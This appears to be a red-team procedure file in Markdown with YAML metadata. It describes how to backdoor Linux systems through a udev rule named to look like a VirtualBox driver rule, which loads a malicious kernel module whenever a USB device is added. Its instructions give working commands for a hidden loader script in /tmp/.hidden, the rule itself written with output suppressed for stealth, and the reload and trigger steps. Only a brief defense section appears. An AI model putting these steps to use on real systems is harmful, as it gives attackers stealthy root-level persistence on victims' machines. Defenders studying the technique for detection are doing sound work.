---
type: procedure
description: >-
  Create a udev rule to load a malicious kernel module when the VirtualBox
  driver is loaded for persistence on Linux systems.
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.096726+00:00'
updated_at: '2023-04-10T20:34:18.245528+00:00'
tactics:
  - '[[Persistence]]'
techniques:
  - '[[Kernel Modules and Extensions]]'
sub_techniques: []
tags:
  - backdooring-driver
  - linux-persistence
  - udev-rules
  - kernel-module
commands:
  - '[[commands/create-backdoor-udev-rule-for-vbox]]'
platforms:
  - Linux
tools: []
validated: true
---

# Backdoor-VirtualBox-Driver-via-Udev-Rules

## Summary

This procedure demonstrates how to backdoor the VirtualBox driver on a Linux system by creating a custom udev rule that automatically loads a malicious kernel module whenever the VirtualBox kernel driver (vboxdrv) is loaded. This technique establishes persistence across reboots, allowing an attacker to regain control of the system without needing to re-exploit it. It targets environments where VirtualBox is installed, such as development or virtualized setups, and assumes the malicious module is pre-placed on the system.

## Description

Backdooring a VirtualBox driver leverages udev rules, which manage device events on Linux, to trigger the loading of a malicious kernel module in response to the VirtualBox driver's initialization. The VirtualBox kernel module (vboxdrv) is commonly loaded on systems with VirtualBox installed for virtualization tasks. By appending a rule to the relevant udev configuration file (e.g., /etc/udev/rules.d/60-vboxdrv.rules or a custom file like 71-vbox-kernel-drivers.rules), the procedure ensures that when a USB device is added (a common trigger in VirtualBox USB passthrough scenarios), a script or command loads the backdoor module. This provides stealthy persistence, as it ties into legitimate driver behavior. The approach is effective in maintaining access for lateral movement, data exfiltration, or further compromise, but requires root privileges. Note that $RSHELL in the rule should be replaced with a command to insmod or load the malicious module (e.g., /path/to/load_backdoor.sh).

## Requirements

1. Root access on the target Linux system to modify /etc/udev/ files.
2. VirtualBox installed with its kernel drivers (vboxdrv) present.
3. Pre-placed malicious kernel module (.ko file) and a script to load it (e.g., via insmod).
4. Knowledge of the system's kernel version to ensure module compatibility.

## Defense

- Monitor file integrity on /etc/udev/rules.d/ for unauthorized modifications using tools like AIDE or Tripwire.
- Restrict root access and use mandatory access controls (e.g., SELinux or AppArmor) to prevent tampering with udev rules.
- Regularly audit loaded kernel modules with lsmod and disable unnecessary drivers like VirtualBox if not required.
- Implement kernel module signing enforcement (CONFIG_MODULE_SIG) to block unsigned modules.

## Objectives

1. Establish persistence by automatically loading a malicious kernel module on VirtualBox driver events.
2. Enable future remote access or control without re-compromise.
3. Minimize detection by blending with legitimate virtualization activity.

## Instructions

1. Verify root access and locate the VirtualBox udev rules file. If it doesn't exist, create a new one.
   - **Context**: Ensure you can modify system-wide udev configurations. The default VirtualBox rules may be in /etc/udev/rules.d/60-vboxdrv.rules; append or create 71-vbox-kernel-drivers.rules for specificity.
   - Run `ls /etc/udev/rules.d/ | grep vbox` to check existing rules.
   - Expected: List of relevant files or confirmation of write access.

2. Prepare the backdoor loading script. Define $RSHELL as a path to a script that loads the malicious module, e.g., `#!/bin/bash insmod /path/to/malicious.ko`.
   - **Context**: $RSHELL must execute the module load (using insmod or modprobe) without alerting the user. Place the script in a hidden location like /tmp/.hidden/load_backdoor.sh and make it executable (chmod +x).
   - Example: echo '#!/bin/bash' > /tmp/.hidden/load_backdoor.sh && echo 'insmod /lib/modules/$(uname -r)/extra/backdoor.ko' >> /tmp/.hidden/load_backdoor.sh && chmod +x /tmp/.hidden/load_backdoor.sh.
   - Expected: Script created and executable; test manually with ./load_backdoor.sh to confirm module loads (check with lsmod | grep backdoor).

3. Create the udev rule to trigger the backdoor on USB device addition, which often occurs with VirtualBox USB handling.
   - **Context**: This step writes the rule that runs the backdoor script when a USB device is added, simulating a VirtualBox-related event. The rule targets USB subsystems to tie into VirtualBox's USB passthrough feature.
   - **Command** ([[commands/create-backdoor-udev-rule-for-vbox]]):
     ```bash
     echo "ACTION==\"add\", ENV{DEVTYPE}==\"usb_device\", SUBSYSTEM==\"usb\", RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
     ```
   - > This command outputs the udev rule syntax to create the file, suppressing output for stealth. Replace $RSHELL with the full path to your backdoor loading script (e.g., /tmp/.hidden/load_backdoor.sh). After creation, reload udev rules with `udevadm control --reload-rules` and trigger a test USB insertion or VirtualBox USB action to verify.
   - Expected: File /etc/udev/rules.d/71-vbox-kernel-drivers.rules created with the rule; no console output due to redirection.

4. Reload udev rules and test persistence.
   - **Context**: Apply the new rule and simulate the trigger to ensure the backdoor loads without errors.
   - Run `udevadm control --reload-rules && udevadm trigger` to apply changes system-wide.
   - Plug in a USB device or start VirtualBox with USB passthrough to trigger.
   - Expected: Backdoor module loaded (verify with `lsmod | grep backdoor`); persistence confirmed on reboot if tied to boot-loaded drivers.
